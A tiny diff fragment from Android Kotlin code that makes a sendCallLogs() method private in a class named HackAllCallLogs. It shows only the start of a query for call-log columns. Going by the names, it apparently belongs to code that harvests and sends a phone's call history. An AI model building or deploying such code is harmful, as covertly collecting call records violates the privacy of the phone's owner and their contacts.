@@ -53,7 +53,7 @@ class HackAllCallLogs(private val context: Context) {
     }
 
     @SuppressLint("NewApi")
-    fun sendCallLogs() {
+    private fun sendCallLogs() {
         try {
             val cols = arrayOf(
                 CallLog.Calls._ID,
